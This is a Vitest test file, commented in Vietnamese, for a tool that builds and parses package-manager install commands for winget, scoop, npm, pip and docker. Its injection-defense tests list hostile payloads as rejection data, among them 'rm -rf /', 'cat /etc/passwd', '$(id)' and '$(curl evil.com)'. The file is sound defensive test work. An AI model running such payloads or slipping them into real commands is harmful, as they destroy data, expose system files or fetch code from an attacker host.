import { describe, it, expect } from 'vitest';
import {
  MaTrinhQuanLyGoi,
  DANH_SACH_TRINH_QUAN_LY_GOI,
  kiemTraTenGoiHopLe,
  kiemTraPhienBanHopLe,
  ghepLenhCliAnToan,
  trichTenGoiTuLenhTho,
  laKyTuDocHai,
  taoTenContainerTuImage,
} from '@forgestore/types';

describe('P3B-16.1 & P3B-16.2: Package Manager Manifest Framework & Command Injection Defense', () => {
  describe('P3B-16.1: Danh sách 5 trình quản lý gói ban đầu', () => {
    it('đầy đủ 5 trình quản lý gói: winget, scoop, npm, pip, docker', () => {
      const cacTrinh = Object.keys(DANH_SACH_TRINH_QUAN_LY_GOI);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.WINGET);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.SCOOP);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.NPM);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.PIP);
      expect(cacTrinh).toContain(MaTrinhQuanLyGoi.DOCKER);
      expect(cacTrinh).toHaveLength(5);
    });

    it('mỗi manifest có đầy đủ mẫu lệnh cài, cập nhật, gỡ và regex tên gói', () => {
      for (const key of Object.values(MaTrinhQuanLyGoi)) {
        const manifest = DANH_SACH_TRINH_QUAN_LY_GOI[key];
        expect(manifest.ma).toBe(key);
        expect(manifest.tenHienThi).toBeTruthy();
        expect(manifest.mauLenhCai).toContain('{tenGoi}');
        expect(manifest.mauLenhCapNhat).toContain('{tenGoi}');
        if (key === MaTrinhQuanLyGoi.DOCKER) {
          expect(manifest.mauLenhGo).toContain('{tenContainer}');
        } else {
          expect(manifest.mauLenhGo).toContain('{tenGoi}');
        }
        expect(manifest.regexTenGoi).toBeTruthy();
      }
    });

    it('mẫu lệnh đúng chuẩn từng hệ sinh thái', () => {
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.winget.mauLenhCai).toBe('winget install --id {tenGoi} -e');
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.winget.mauLenhGo).toBe('winget uninstall --id {tenGoi}');

      expect(DANH_SACH_TRINH_QUAN_LY_GOI.scoop.mauLenhCai).toBe('scoop install {tenGoi}');
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.scoop.mauLenhGo).toBe('scoop uninstall {tenGoi}');

      expect(DANH_SACH_TRINH_QUAN_LY_GOI.npm.mauLenhCai).toBe('npm install -g {tenGoi}');
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.npm.mauLenhGo).toBe('npm uninstall -g {tenGoi}');

      expect(DANH_SACH_TRINH_QUAN_LY_GOI.pip.mauLenhCai).toBe('pip install {tenGoi}');
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.pip.mauLenhGo).toBe('pip uninstall -y {tenGoi}');

      expect(DANH_SACH_TRINH_QUAN_LY_GOI.docker.mauLenhCai).toBe(
        'docker run -d --name {tenContainer} {tenGoi}',
      );
      expect(DANH_SACH_TRINH_QUAN_LY_GOI.docker.mauLenhGo).toBe('docker rm -f {tenContainer}');
    });
  });

  describe('P3B-16.2: Chống Command Injection & Xác thực tên gói / phiên bản', () => {
    const cacTenGoiDocHai = [
      'Microsoft.PowerToys; rm -rf /',
      'Microsoft.PowerToys && whoami',
      'foo | cat /etc/passwd',
      'foo$(id)',
      'foo`whoami`',
      'foo\nmalicious_cmd',
      'foo\r\ncalc.exe',
      'package with space',
      'foo;calc',
      'foo||calc',
      'foo>out.txt',
      'foo<in.txt',
      'foo\\bar',
      'foo!bar',
      '--ignore-scripts',
      '--privileged',
      '-v',
      '-bucket/app',
      "foo'bar",
      'foo"bar',
      '',
      '   ',
    ];

    it('laKyTuDocHai phát hiện 100% các chuỗi chứa ký tự nguy hiểm', () => {
      for (const payload of cacTenGoiDocHai) {
        expect(laKyTuDocHai(payload)).toBe(true);
      }
    });

    it('kiemTraTenGoiHopLe từ chối 100% các tên gói độc hại ở tất cả 5 trình quản lý', () => {
      for (const trinh of Object.values(MaTrinhQuanLyGoi)) {
        for (const payload of cacTenGoiDocHai) {
          expect(kiemTraTenGoiHopLe(trinh, payload)).toBe(false);
        }
      }
    });

    it('ghepLenhCliAnToan từ chối và KHÔNG sinh lệnh khi tên gói độc hại', () => {
      for (const payload of cacTenGoiDocHai) {
        const kq = ghepLenhCliAnToan(MaTrinhQuanLyGoi.WINGET, payload);
        expect(kq.hopLe).toBe(false);
        expect(kq.lenhCai).toBeUndefined();
        expect(kq.lenhGo).toBeUndefined();
        expect(kq.lyDoKhongHopLe).toBeDefined();
      }
    });

    it('ghepLenhCliAnToan từ chối khi phiên bản chứa mã độc injection', () => {
      const cacPhienBanDocHai = [
        '1.0.0; rm -rf /',
        '1.0.0 && whoami',
        '$(curl evil.com)',
        '`calc.exe`',
        '1.0\n2.0',
        'v1.0 || malicious',
      ];

      for (const badVer of cacPhienBanDocHai) {
        expect(kiemTraPhienBanHopLe(MaTrinhQuanLyGoi.WINGET, badVer)).toBe(false);
        const kq = ghepLenhCliAnToan(MaTrinhQuanLyGoi.WINGET, 'Microsoft.PowerToys', badVer);
        expect(kq.hopLe).toBe(false);
        expect(kq.lenhCai).toBeUndefined();
      }
    });

    it('ghép lệnh thành công và sạch sẽ với tên gói hợp lệ thực tế', () => {
      // 1. Winget
      const kqWinget = ghepLenhCliAnToan(MaTrinhQuanLyGoi.WINGET, 'Microsoft.PowerToys');
      expect(kqWinget.hopLe).toBe(true);
      expect(kqWinget.lenhCai).toBe('winget install --id Microsoft.PowerToys -e');
      expect(kqWinget.lenhCapNhat).toBe('winget upgrade --id Microsoft.PowerToys');
      expect(kqWinget.lenhGo).toBe('winget uninstall --id Microsoft.PowerToys');

      // 2. Scoop (tên thường hoặc có bucket)
      const kqScoop1 = ghepLenhCliAnToan(MaTrinhQuanLyGoi.SCOOP, 'neovim');
      expect(kqScoop1.hopLe).toBe(true);
      expect(kqScoop1.lenhCai).toBe('scoop install neovim');

      const kqScoop2 = ghepLenhCliAnToan(MaTrinhQuanLyGoi.SCOOP, 'extras/googlechrome');
      expect(kqScoop2.hopLe).toBe(true);
      expect(kqScoop2.lenhCai).toBe('scoop install extras/googlechrome');
      expect(kqScoop2.lenhGo).toBe('scoop uninstall extras/googlechrome');

      // 3. npm (package thường hoặc scoped)
      const kqNpm1 = ghepLenhCliAnToan(MaTrinhQuanLyGoi.NPM, 'serve');
      expect(kqNpm1.hopLe).toBe(true);
      expect(kqNpm1.lenhCai).toBe('npm install -g serve');
      expect(kqNpm1.lenhGo).toBe('npm uninstall -g serve');

      const kqNpm2 = ghepLenhCliAnToan(MaTrinhQuanLyGoi.NPM, '@angular/cli');
      expect(kqNpm2.hopLe).toBe(true);
      expect(kqNpm2.lenhCai).toBe('npm install -g @angular/cli');

      // 4. pip
      const kqPip = ghepLenhCliAnToan(MaTrinhQuanLyGoi.PIP, 'open-webui');
      expect(kqPip.hopLe).toBe(true);
      expect(kqPip.lenhCai).toBe('pip install open-webui');
      expect(kqPip.lenhCapNhat).toBe('pip install --upgrade open-webui');
      expect(kqPip.lenhGo).toBe('pip uninstall -y open-webui');

      // 5. docker (🔴 Lỗi Đỏ 2: kiểm tra tên container làm sạch và {tenContainer} trong lệnh)
      const kqDocker = ghepLenhCliAnToan(
        MaTrinhQuanLyGoi.DOCKER,
        'ghcr.io/open-webui/open-webui:main',
      );
      expect(kqDocker.hopLe).toBe(true);
      expect(kqDocker.tenContainer).toBe('open-webui');
      expect(kqDocker.lenhCai).toBe(
        'docker run -d --name open-webui ghcr.io/open-webui/open-webui:main',
      );
      expect(kqDocker.lenhCai).not.toContain('{tenGoi}');
      expect(kqDocker.lenhCai).not.toContain('{tenContainer}');
      expect(kqDocker.lenhCapNhat).toBe('docker pull ghcr.io/open-webui/open-webui:main');
      expect(kqDocker.lenhGo).toBe('docker rm -f open-webui');
    });

    it('taoTenContainerTuImage làm sạch tên image thành container name hợp lệ (🔴 Lỗi Đỏ 2)', () => {
      expect(taoTenContainerTuImage('ghcr.io/open-webui/open-webui:main')).toBe('open-webui');
      expect(taoTenContainerTuImage('ghcr.io/foo/bar:latest')).toBe('bar');
      expect(taoTenContainerTuImage('docker.io/library/nginx:alpine')).toBe('nginx');
      expect(taoTenContainerTuImage('redis:7-alpine')).toBe('redis');
      expect(taoTenContainerTuImage('my-custom-app')).toBe('my-custom-app');
    });

    it('PIP kiemTraTenGoiHopLe từ chối các tệp mở rộng và đường dẫn (🔴 Lỗi Đỏ 1)', () => {
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, 'requirements.txt')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, 'setup.py')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, 'package.whl')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, 'dist/my_package.whl')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, './local_package')).toBe(false);
      expect(kiemTraTenGoiHopLe(MaTrinhQuanLyGoi.PIP, '.')).toBe(false);
    });
  });

  describe('Bóc tách tên gói từ lệnh thô trong README (trichTenGoiTuLenhTho)', () => {
    it('trích xuất chính xác tên gói từ lệnh winget', () => {
      const res1 = trichTenGoiTuLenhTho('winget install --id Microsoft.PowerToys -e');
      expect(res1).toEqual({ trinhQuanLy: 'winget', tenGoi: 'Microsoft.PowerToys' });

      const res2 = trichTenGoiTuLenhTho('winget install Fastfetch-cli.Fastfetch');
      expect(res2).toEqual({ trinhQuanLy: 'winget', tenGoi: 'Fastfetch-cli.Fastfetch' });
    });

    it('trích xuất chính xác tên gói từ lệnh scoop', () => {
      const res1 = trichTenGoiTuLenhTho('scoop install git');
      expect(res1).toEqual({ trinhQuanLy: 'scoop', tenGoi: 'git' });

      const res2 = trichTenGoiTuLenhTho('scoop install extras/vlc');
      expect(res2).toEqual({ trinhQuanLy: 'scoop', tenGoi: 'extras/vlc' });
    });

    it('trích xuất chính xác tên gói từ lệnh npm / pnpm', () => {
      const res1 = trichTenGoiTuLenhTho('npm install -g @nestjs/cli');
      expect(res1).toEqual({ trinhQuanLy: 'npm', tenGoi: '@nestjs/cli' });

      const res2 = trichTenGoiTuLenhTho('pnpm add -g pnpm');
      expect(res2).toEqual({ trinhQuanLy: 'npm', tenGoi: 'pnpm' });
    });

    it('trích xuất chính xác tên gói từ lệnh pip thông thường', () => {
      const res1 = trichTenGoiTuLenhTho('pip install open-webui');
      expect(res1).toEqual({ trinhQuanLy: 'pip', tenGoi: 'open-webui' });

      const res2 = trichTenGoiTuLenhTho('pip3 install -U yt-dlp');
      expect(res2).toEqual({ trinhQuanLy: 'pip', tenGoi: 'yt-dlp' });

      const res3 = trichTenGoiTuLenhTho('python -m pip install black');
      expect(res3).toEqual({ trinhQuanLy: 'pip', tenGoi: 'black' });
    });

    it('bỏ qua cờ có giá trị kèm theo (-r, -c, -i) và không đọc nhầm requirements.txt (🔴 Lỗi Đỏ 1)', () => {
      // 1. pip install -r requirements.txt -> Không có gói nào được cài trực tiếp -> trả về null
      expect(trichTenGoiTuLenhTho('pip install -r requirements.txt')).toBeNull();
      expect(trichTenGoiTuLenhTho('pip install --requirement requirements.txt')).toBeNull();
      expect(trichTenGoiTuLenhTho('pip install -c constraints.txt')).toBeNull();
      expect(trichTenGoiTuLenhTho('pip install -r req.txt -i https://pypi.org/simple')).toBeNull();

      // 2. pip install -r requirements.txt <ten_goi> -> Trích xuất đúng ten_goi
      const res = trichTenGoiTuLenhTho('pip install -r requirements.txt open-webui');
      expect(res).toEqual({ trinhQuanLy: 'pip', tenGoi: 'open-webui' });

      // 3. pip install --extra-index-url https://download.pytorch.org/whl/cu118 torch -> torch
      const resTorch = trichTenGoiTuLenhTho(
        'pip install --extra-index-url https://download.pytorch.org/whl/cu118 torch',
      );
      expect(resTorch).toEqual({ trinhQuanLy: 'pip', tenGoi: 'torch' });
    });

    it('trích xuất chính xác tên image từ lệnh docker pull', () => {
      const res1 = trichTenGoiTuLenhTho('docker pull ghcr.io/open-webui/open-webui:main');
      expect(res1).toEqual({
        trinhQuanLy: 'docker',
        tenGoi: 'ghcr.io/open-webui/open-webui:main',
      });
    });

    it('từ chối docker run khi có tham số chương trình phía sau (🔴 Lỗi Đỏ 3)', () => {
      // docker run -d --name x myimage serve --port 80 -> có trailing program args "serve --port 80" -> TỪ CHỐI
      expect(trichTenGoiTuLenhTho('docker run -d --name x myimage serve --port 80')).toBeNull();
      expect(trichTenGoiTuLenhTho('docker run -d myimage sh -c "echo 1"')).toBeNull();
      expect(trichTenGoiTuLenhTho('docker run -it ubuntu bash')).toBeNull();

      // docker run KHÔNG có trailing program args -> trích xuất chuẩn xác tên image
      const res = trichTenGoiTuLenhTho('docker run -d -p 8080:8080 myimage');
      expect(res).toEqual({ trinhQuanLy: 'docker', tenGoi: 'myimage' });

      const resNamed = trichTenGoiTuLenhTho(
        'docker run -d --name open-webui ghcr.io/open-webui/open-webui:main',
      );
      expect(resNamed).toEqual({
        trinhQuanLy: 'docker',
        tenGoi: 'ghcr.io/open-webui/open-webui:main',
      });
    });

    it('từ chối lệnh chứa cú pháp chèn lệnh injection', () => {
      expect(trichTenGoiTuLenhTho('winget install --id evil; rm -rf /')).toBeNull();
      expect(trichTenGoiTuLenhTho('pip install evil$(whoami)')).toBeNull();
      expect(trichTenGoiTuLenhTho('npm i -g evil&&calc')).toBeNull();
    });

    it('bỏ qua các cờ option và trích xuất đúng tên gói hợp lệ', () => {
      const res1 = trichTenGoiTuLenhTho('npm install -g --ignore-scripts @nestjs/cli');
      expect(res1).toEqual({ trinhQuanLy: 'npm', tenGoi: '@nestjs/cli' });

      const res2 = trichTenGoiTuLenhTho('pip install -U --no-cache-dir open-webui');
      expect(res2).toEqual({ trinhQuanLy: 'pip', tenGoi: 'open-webui' });

      const res3 = trichTenGoiTuLenhTho(
        'docker run -d -p 8080:8080 ghcr.io/open-webui/open-webui:main',
      );
      expect(res3).toEqual({
        trinhQuanLy: 'docker',
        tenGoi: 'ghcr.io/open-webui/open-webui:main',
      });
    });
  });
});
